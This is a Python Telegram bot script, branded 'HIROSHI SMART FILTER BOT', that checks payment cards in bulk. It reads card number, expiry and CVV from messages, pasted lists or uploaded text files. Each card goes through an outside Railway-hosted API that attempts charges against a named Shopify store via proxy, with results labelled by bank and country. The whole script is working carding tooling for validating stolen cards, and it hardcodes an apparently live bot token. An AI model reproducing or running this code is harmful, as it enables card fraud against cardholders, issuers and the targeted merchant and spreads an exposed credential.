import asyncio
import re
import json
import random
import aiohttp
from datetime import datetime
import uuid
import warnings
import telebot

warnings.filterwarnings('ignore')

# ────────────────────────── Telegram Bot Setup ──────────────────────────
BOT_TOKEN = '8745020701:AAHpYc10Y7MBSZNj7fSiCdTEsB_oiYZB3Bg'
bot = telebot.TeleBot(BOT_TOKEN)

# ────────────────────────── BIN Lookup Function ──────────────────────────

async def get_bin_info(cc_number):
    bin_num = cc_number[:8]
    url = f"https://data.handyapi.com/bin/{bin_num}"
    
    info = {
        'vendor': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'flag': '🏳️'
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=4) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get('Status') == 'SUCCESS':
                        info['vendor'] = str(data.get('Scheme', 'UNKNOWN')).upper()
                        info['type'] = str(data.get('Type', 'UNKNOWN')).upper()
                        info['level'] = str(data.get('CardTier', 'UNKNOWN')).upper()
                        info['bank'] = str(data.get('Issuer', 'UNKNOWN'))
                        info['country'] = str(data.get('Country', {}).get('Name', 'UNKNOWN'))
                        info['flag'] = str(data.get('Country', {}).get('A2', '🏳️'))
    except Exception:
        pass
    return info

# ─────────────────────── Railway API Check Logic ───────────────────────────

async def process_railway_card(cc, mes, ano, cvv):
    target_site = "https://ferrierdesigns.myshopify.com"
    api_url = f"https://web-production-92c8c.up.railway.app/shopify?site={target_site}&cc={cc}|{mes}|{ano}|{cvv}&proxy=proxy"
    
    try:
        timeout = aiohttp.ClientTimeout(total=45)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url) as resp:
                if resp.status == 200:
                    try:
                        result_json = await resp.json()
                        api_response = result_json.get("Response", "UNKNOWN")
                        gateway = result_json.get("Gateway", "Shopify Payments")
                        return api_response, gateway
                    except Exception:
                        text_resp = await resp.text()
                        return text_resp[:50], "Shopify"
                else:
                    return f"Server Error ({resp.status})", "Shopify"
    except Exception as e:
        return f"Connection Failed: {str(e)}", "Shopify"

# ─────────────────────── Combined Card Check ───────────────────────────

async def check_card(cc, mes, ano, cvv):
    bin_info = await get_bin_info(cc)
    api_response, gateway = await process_railway_card(cc, mes, ano, cvv)
    
    response_upper = api_response.upper()
    
    # CRITICAL FIX: Custom Smart Filtering Logic to bypass API bug
    if "THANK YOU" in response_upper or "SUCCESS" in response_upper or "APPROVED" in response_upper:
        status_text = "✅ Approved (Charged)"
    elif "FUNDS" in response_upper or "INSUFFICIENT" in response_upper:
        status_text = "💸 Insufficient Funds"
    elif "CVV" in response_upper or "AVS" in response_upper or "CCN" in response_upper:
        status_text = "💎 CCN Approved"
    else:
        status_text = "❌ Declined"
        
    return (
        f"<b>--- RESULT ---</b>\n"
        f"<b>Card:</b> <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
        f"<b>Status:</b> {status_text}\n"
        f"<b>Response:</b> {api_response}\n"
        f"<b>Gateway:</b> {gateway}\n"
        f"<b>Card Info:</b> {bin_info['vendor']} - {bin_info['type']} ({bin_info['level']})\n"
        f"<b>Bank:</b> {bin_info['bank']}\n"
        f"<b>Country:</b> {bin_info['country']} {bin_info['flag']}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>By ⇾ 『@Thesquad667』</b>"
    )

# ────────────────────────── Telegram Handlers ──────────────────────────

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    start_text = (
        "🤖 <b>HIROSHI SMART FILTER BOT</b>\n\n"
        "<b>Commands Available:</b>\n"
        "➡️ <code>/chk cc|mm|yyyy|cvv</code> - Check a single card directly.\n"
        "➡️ <code>/mass cc|mm|yyyy|cvv</code> - Check multiple cards sequentially."
    )
    bot.reply_to(message, start_text, parse_mode="HTML")

@bot.message_handler(commands=['chk'])
def handle_chk_command(message):
    match = re.search(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', message.text)
    if not match:
        bot.reply_to(message, "⚠️ <b>Syntax Error.</b>\nUse: <code>/chk cc|mm|yyyy|cvv</code>", parse_mode="HTML")
        return
    
    cc, mes, ano, cvv = match.groups()
    loading_msg = bot.reply_to(message, "⏳ Filtering data, verifying real response...", parse_mode="HTML")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result_text = loop.run_until_complete(check_card(cc, mes, ano, cvv))
        bot.edit_message_text(text=result_text, chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(text=f"❌ <b>System Error:</b> <code>{str(e)}</code>", chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode="HTML")

@bot.message_handler(commands=['mass'])
def handle_mass_command(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "⚠️ <b>Syntax Error.</b>", parse_mode="HTML")
        return
    
    input_text = message.text.split(None, 1)[1]
    cards = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', input_text)
    
    if not cards:
        bot.reply_to(message, "⚠️ No valid card formats found.", parse_mode="HTML")
        return
        
    total_cards = len(cards)
    status_msg = bot.reply_to(message, f"⏳ <b>[{total_cards}]</b> Cards queued. Analyzing real endpoint responses...", parse_mode="HTML")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    for index, (cc, mes, ano, cvv) in enumerate(cards, start=1):
        try:
            bot.edit_message_text(
                text=f"⏳ Processing <b>[{index}/{total_cards}]</b>...\n<code>{cc}|{mes}|{ano}|{cvv}</code>",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode="HTML"
            )
            
            result_text = loop.run_until_complete(check_card(cc, mes, ano, cvv))
            bot.send_message(message.chat.id, result_text, parse_mode="HTML")
            asyncio.run(asyncio.sleep(3))
            
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")

    bot.send_message(message.chat.id, f"✅ Completed checking all <b>[{total_cards}]</b> cards.", parse_mode="HTML")

@bot.message_handler(content_types=['document'])
def handle_txt_file(message):
    if message.document.file_name.endswith('.txt'):
        status_download = bot.reply_to(message, "📥 Pulling file stream...")
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        
        bot.delete_message(chat_id=message.chat.id, message_id=status_download.message_id)
        
        cards = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', file_content)
        if not cards:
            bot.reply_to(message, "⚠️ No valid card formats found in file.", parse_mode="HTML")
            return
            
        total_cards = len(cards)
        status_msg = bot.reply_to(message, f"⏳ <b>[{total_cards}]</b> Cards from file queued. Analysing...", parse_mode="HTML")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        for index, (cc, mes, ano, cvv) in enumerate(cards, start=1):
            try:
                bot.edit_message_text(text=f"⏳ Processing file card <b>[{index}/{total_cards}]</b>...\n<code>{cc}|{mes}|{ano}|{cvv}</code>", chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="HTML")
                result_text = loop.run_until_complete(check_card(cc, mes, ano, cvv))
                bot.send_message(message.chat.id, result_text, parse_mode="HTML")
                asyncio.run(asyncio.sleep(3))
            except Exception as e: pass
        bot.send_message(message.chat.id, f"✅ Completed checking all <b>[{total_cards}]</b> cards from file.", parse_mode="HTML")

@bot.message_handler(func=lambda message: True)
def handle_text_messages(message):
    lines = message.text.strip().split('\n')
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    if len(lines) == 1:
        match = re.search(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', message.text.strip())
        if not match: return 
        cc, mes, ano, cvv = match.groups()
        loading_msg = bot.reply_to(message, "⏳ Connecting to Railway API...")
        try:
            result_text = loop.run_until_complete(check_card(cc, mes, ano, cvv))
            bot.edit_message_text(text=result_text, chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode="HTML")
        except Exception as e:
            bot.edit_message_text(text=f"❌ <b>System Error:</b> <code>{str(e)}</code>", chat_id=message.chat.id, message_id=loading_msg.message_id, parse_mode="HTML")
    else:
        input_text = message.text
        cards = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', input_text)
        if not cards: return
        total_cards = len(cards)
        status_msg = bot.reply_to(message, f"⏳ <b>[{total_cards}]</b> Cards pasted directly. Starting...", parse_mode="HTML")
        for index, (cc, mes, ano, cvv) in enumerate(cards, start=1):
            try:
                bot.edit_message_text(text=f"⏳ Processing <b>[{index}/{total_cards}]</b>...\n<code>{cc}|{mes}|{ano}|{cvv}</code>", chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="HTML")
                result_text = loop.run_until_complete(check_card(cc, mes, ano, cvv))
                bot.send_message(message.chat.id, result_text, parse_mode="HTML")
                asyncio.run(asyncio.sleep(3))
            except Exception as e: pass

if __name__ == "__main__":
    print("🤖 HIROSHI SMART FILTER BOT is running smoothly...")
    bot.infinity_polling()
  
